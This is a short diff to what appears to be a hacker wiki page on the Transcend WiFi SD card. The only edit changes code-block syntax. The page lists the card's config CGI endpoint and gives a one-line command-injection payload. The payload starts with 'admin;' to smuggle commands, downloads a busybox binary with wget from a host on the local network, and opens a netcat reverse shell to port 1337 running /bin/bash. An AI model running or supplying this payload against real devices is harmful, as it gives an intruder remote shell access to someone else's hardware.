@@ -6,7 +6,7 @@ title: Transcend WiFi SD
 * http://192.168.11.254/cgi-bin/kcard_edit_config_insup.pl
 * http://dmitry.gr/index.php?r=05.Projects&proj=15.%20Transcend%20WiFiSD
 
-<code bash>
+```bash
 admin; wget http://192.168.11.11/busybox-armv5l; chmod a+x /www/cgi-bin/busybox-armv5l; /www/cgi-bin/busybox-armv5l nc 192.168.11.11 1337 -e /bin/bash #
 ```
 
